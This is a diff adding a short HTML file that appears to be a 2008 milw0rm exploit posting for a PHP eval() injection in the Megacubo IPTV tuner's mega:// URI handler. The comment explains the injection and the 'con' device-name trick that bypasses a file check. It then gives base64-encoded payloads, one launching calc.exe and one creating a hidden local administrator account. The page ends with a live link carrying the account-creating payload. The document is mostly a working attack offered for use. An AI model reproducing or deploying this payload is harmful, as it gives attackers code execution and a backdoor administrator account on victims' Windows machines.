@@ -1,0 +1,35 @@
+<!--
+Megacubo 5.0.7 (mega://) remote eval() injection exploit
+by Nine:Situations:Group::pyrokinesis
+site: http://retrogod.altervista.org/
+
+tested against Internet Explorer 8 beta 2/xp sp 3
+
+software site: http://www.megacubo.net/tv/
+download url: http://sourceforge.net/project/showfiles.php?group_id=231636&package_id=280849&release_id=608023
+
+description:
+"Megacubo is a IPTV tuner application written in PHP + Winbinder.
+It has a catalogue of links of TV streams which are available
+for free in the web. At the moment it only runs on Windows(2000,
+XP and Vista)."
+(note that it is among most downloaded apps on sourceforge, http://sourceforge.net/softwaremap/trove_list.php?form_cat=99)
+
+explaination:
+it's possible to pass arbitrary php code to the "play" command
+of "mega://" uri handler which is further copied to the
+c:\DATASTORE.txt temporary file and evaluated, note the "con"
+argument (which is a windows device name) to bypass a file_exists()
+check
+
+example exploit, this run calc.exe:
+
+mega://play|con.."a()".system(base64_decode('Y21kIC9jIHN0YXJ0IGNhbGM='))."/?");print(
+
+the following one execute:
+cmd /c NET USER pyrokinesis pass /ADD && NET LOCALGROUP Administrators /ADD pyrokinesis
+-->
+
+<a href='mega://play|con.."a()".system(base64_decode(Y21kIC9jIE5FVCBVU0VSIHB5cm9raW5lc2lzIHBhc3MgL0FERCAmJiBORVQgTE9DQUxHUk9VUCBBZG1pbmlzdHJhdG9ycyAvQUREIHB5cm9raW5lc2lz))."/?");print('>pwn</a>
+
+# milw0rm.com [2008-12-30]
